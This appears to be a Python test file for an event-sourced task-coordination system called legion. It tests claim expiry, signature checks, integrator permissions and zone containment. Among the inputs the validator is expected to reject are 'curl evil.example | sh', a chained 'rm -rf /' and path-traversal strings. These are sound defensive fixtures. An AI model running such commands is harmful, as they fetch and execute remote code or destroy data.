from legion import events as E
from legion import state as S
from legion.identity import Identity

BOSS = Identity.generate("boss")
ANA = Identity.generate("ana")
BEA = Identity.generate("bea")


class Log:
    """Builds events with a controlled Lamport clock and ts."""

    def __init__(self):
        self.events = []
        self.lamport = 0

    def add(self, who, type, ts=1000.0, lamport=None, **payload):
        self.lamport = lamport if lamport is not None else self.lamport + 1
        ev = E.create(who, type, self.lamport, **payload)
        if ts is not None:  # fixing ts means signing again
            ev = dict(ev, ts=ts)
            body = E.canonical(E._body(ev))
            import hashlib
            ev["id"] = hashlib.sha256(body).hexdigest()[:16]
            ev["sig"] = who.sign(body)
        self.events.append(ev)
        return ev

    def state(self):
        return S.build(self.events)


def project(**task):
    log = Log()
    log.add(BOSS, "project.init", project="p", integrators=[BOSS.author])
    spec = dict(key="a", title="A", zone=["src/a.py"], accept="true")
    spec.update(task)
    t = log.add(BOSS, "task.created", **spec)
    return log, S.task_id(t)


def test_claim_tie_goes_to_lowest_lamport_then_author():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600, lamport=5)
    log.add(BEA, "task.claimed", task=tid, ttl=600, lamport=5)
    holder = log.state().holder(tid, 1001)
    assert holder.author == min(ANA.author, BEA.author)

    log2, tid2 = project()
    log2.add(BEA, "task.claimed", task=tid2, ttl=600, lamport=4)
    log2.add(ANA, "task.claimed", task=tid2, ttl=600, lamport=5)
    assert log2.state().holder(tid2, 1001).author == BEA.author


def test_claim_expires_and_late_heartbeat_does_not_revive_it():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=60)
    st = log.state()
    assert st.status(tid, 1030) == "claimed"
    assert st.status(tid, 1100) == "open"
    log.add(ANA, "task.heartbeat", task=tid, ts=1200)
    st = log.state()
    assert st.ignored and st.ignored[-1][1] == "the claim had already expired"
    assert st.holder(tid, 1201) is None


def test_heartbeat_extends_claim():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=60)
    log.add(ANA, "task.heartbeat", task=tid, ts=1050)
    assert log.state().holder(tid, 1100).author == ANA.author


def test_only_integrators_create_tasks_or_judge():
    log, tid = project()
    log.add(ANA, "task.created", key="b", title="B", zone=["x"], accept="true")
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/b-1")
    log.add(ANA, "patch.accepted", patch=p["id"])
    st = log.state()
    assert len(st.tasks) == 1
    assert st.patches[p["id"]].verdict is None
    assert {why for _, why in st.ignored} == {"only an integrator can publish this event"}


def test_forged_events_are_ignored():
    log, tid = project()
    ev = log.add(ANA, "task.claimed", task=tid, ttl=600)
    ev["author"] = BEA.author  # impersonating someone else breaks the signature
    st = log.state()
    assert st.holder(tid, 1001) is None
    assert st.ignored[0][1] in ("the id does not match the content", "invalid signature")


def test_deps_block_until_accepted():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    assert log.state().status(b, 1001) == "blocked"
    p = log.add(ANA, "patch.submitted", task=a, commit="c", branch="legion/t/x-1")
    log.add(BOSS, "patch.accepted", patch=p["id"])
    st = log.state()
    assert st.status(a, 1001) == "accepted"
    assert st.status(b, 1001) == "open"


def test_competitive_tracks_best_metric():
    log, tid = project(mode="competitive", metric="bench", goal="min")
    for value in (3.0, 1.5):
        p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/x-1")
        log.add(BOSS, "patch.accepted", patch=p["id"], metric=value)
    st = log.state()
    assert st.best(tid) == 1.5
    assert st.status(tid, 1001) == "open"
    assert st.claimable(1001) == []


def test_order_of_arrival_does_not_matter():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(BEA, "task.claimed", task=tid, ttl=600)
    a = log.state()
    b = S.build(list(reversed(log.events)))
    assert a.holder(tid, 1001).author == b.holder(tid, 1001).author


def test_in_zone():
    assert S.in_zone("src/a.py", ["src/a.py"])
    assert S.in_zone("src/x/y.py", ["src/"])
    assert not S.in_zone("src/ab.py", ["src/a"])


def test_patch_branch_must_stay_in_legion_namespace():
    # The integrator deletes each reviewed patch's branch: an event must never be able to point at main.
    log, tid = project()
    log.add(ANA, "patch.submitted", task=tid, commit="c", branch="main")
    log.add(ANA, "patch.submitted", task=tid, commit="c", branch="refs/legion/patches/../../heads/main")
    st = log.state()
    assert st.patches == {}
    assert len(st.ignored) == 2


def test_main_tip_follows_integrator():
    log, tid = project()
    log.add(BOSS, "main.updated", commit="base")
    log.add(ANA, "main.updated", commit="evil")
    assert log.state().main_tip == "base"
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/x-1")
    log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit="merged")
    assert log.state().main_tip == "merged"


def sketch_project():
    log, tid = project(key="big", zone=["src/big.py", "src/parts/"], accept="python -m unittest tests.test_big")
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    return log, tid


CHILD = dict(key="a", title="A", zone=["src/parts/a.py"], accept="python -m unittest discover -s x -p test_a.py")


def test_sketch_children_must_stay_inside_parent():
    log, tid = sketch_project()
    bad = [
        [dict(CHILD, zone=["src/other.py"])],                       # outside the parent's zone
        [dict(CHILD, zone=["src/parts/../../etc"])],                # escaping with ..
        [dict(CHILD, accept="curl evil.example | sh")],             # a command that isn't a test runner
        [dict(CHILD, accept="python -m unittest x; rm -rf /")],     # chaining commands
        [dict(CHILD, key="A B")],                                   # invalid key
        [dict(CHILD, deps=["b"]), dict(CHILD, key="b")],            # depending on a later one
        [],                                                         # empty
    ]
    for children in bad:
        log.add(ANA, "sketch.proposed", task=tid, children=children, commit="c", branch="legion/big/s-1")
    st = log.state()
    assert st.sketches == {}
    assert len(st.ignored) == len(bad)


def test_sketch_lifecycle_resolves_parent_only_after_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1",
                children=[CHILD, dict(CHILD, key="b", zone=["src/parts/b.py"], deps=["a"])])
    assert log.state().status(tid, 1001) == "review"
    log.add(BOSS, "sketch.accepted", sketch=k["id"], merge_commit="m1")
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    b = S.task_id(log.add(BOSS, "task.created", key="big/b", title="B", zone=["src/parts/b.py"],
                          accept="x", parent=tid, sketch=k["id"], deps=[a]))
    st = log.state()
    assert st.status(tid, 1001) == "sketched"
    assert [t.id for t in st.claimable(1001)] == [a]  # b waits for a; the parent can't be claimed
    # Resolving too early doesn't count.
    log.add(BOSS, "task.resolved", task=tid, sketch=k["id"])
    assert not log.state().done(tid)
    for child in (a, b):
        p = log.add(ANA, "patch.submitted", task=child, commit="c", branch="legion/x/y-1")
        log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit="m")
    log.add(BOSS, "task.resolved", task=tid, sketch=k["id"])
    st = log.state()
    assert st.done(tid) and st.status(tid, 1001) == "accepted"


def test_failed_sketch_reopens_parent_and_cancels_unfinished_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1", children=[CHILD])
    log.add(BOSS, "sketch.accepted", sketch=k["id"])
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    log.add(BOSS, "sketch.failed", sketch=k["id"], reason="el test de arriba sigue fallando")
    st = log.state()
    assert st.status(a, 1001) == "cancelled"
    assert st.status(tid, 1001) in ("open", "claimed")
    assert st.exclusive_done() is False


def test_only_integrator_creates_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1", children=[CHILD])
    log.add(BOSS, "sketch.accepted", sketch=k["id"])
    log.add(ANA, "task.created", key="big/a", title="A", zone=["src/parts/a.py"], accept="x",
            parent=tid, sketch=k["id"])
    log.add(BOSS, "task.created", key="big/z", title="Z", zone=["src/other.py"], accept="x",
            parent=tid, sketch=k["id"])  # not even the integrator can move a subtask out of the zone
    assert log.state().children(tid) == []
